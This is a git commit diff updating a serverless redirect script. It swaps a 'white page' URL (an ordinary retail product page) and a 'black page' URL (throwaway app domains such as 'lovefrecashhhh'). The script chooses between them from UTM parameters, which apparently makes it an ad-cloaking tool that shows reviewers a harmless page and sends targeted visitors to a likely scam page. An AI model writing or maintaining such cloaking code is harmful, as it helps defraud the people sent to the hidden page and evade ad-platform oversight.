307b23f79cbba1f7ca14e5364d33de9581960c2f
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-10-09 06:03:29 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.sweetcare.com/be/oleoban-baby-bath-dehydrated-dry-skin-p-007395on?st=02&country=be";
-    const blackPageURL = "https://nowhereher.lovable.app/";
+    const whitePageURL = "https://www.astrupgroup.com/puslespil-nordiske-hav-60-br/";
+    const blackPageURL = "https://lovefrecashhhh.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,3 +26,4 @@ export default function handler(req, res) {
     res.end();
 
   }
+
